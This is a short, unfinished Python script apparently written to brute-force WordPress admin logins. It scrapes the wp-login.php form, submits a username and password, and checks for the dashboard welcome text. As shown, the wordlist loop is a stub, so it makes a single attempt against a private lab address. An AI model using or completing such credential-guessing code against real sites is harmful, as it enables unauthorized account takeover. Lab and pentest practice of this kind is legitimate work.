from bs4 import BeautifulSoup
import requests
import time


class WordpressLogin:
    def __init__(self, target: str):
        self.target: str = target
        self.user = None
        self.password = None

    def _get_params(self, content: bytes) -> dict:
        """An internal function to fetch parameters

        This is an internal function which fetches both hidden av visible
        input fields from a given html text.

        args:
            content (bytes): web content from beautifulsoup in bytes

        returns:
            params (dict): A dict with input fields"""
        params = {}
        print(type(content))
        soup = BeautifulSoup(content, "html.parser")
        for param in soup.find_all("input"):
            name = param.get("name")
            if name is not None:
                params[name] = param.get("value", None)
        return params

    def login_brute(
        self,
        user: str | None = None,
        password: str | None = None,
        wordlist: str | None = None,
    ):
        # create a list of given passwords + wordlist passwords
        passwords = []
        if password is not None:
            passwords.append(password)
        elif wordlist is not None:
            print("WORDLIST HERE PLEASE")
        s = requests.Session()
        login_page = s.get(self.target)
        params = self._get_params(login_page.content)
        params["log"] = user
        params["pwd"] = password
        t = s.post(self.target, data=params)
        if "Welcome to WordPress!" in t.text:
            print("success")


if __name__ == "__main__":
    test = WordpressLogin(target="http://10.1.1.39:8080/wp-login.php")
    test.login_brute(user="admin", password="abc123")
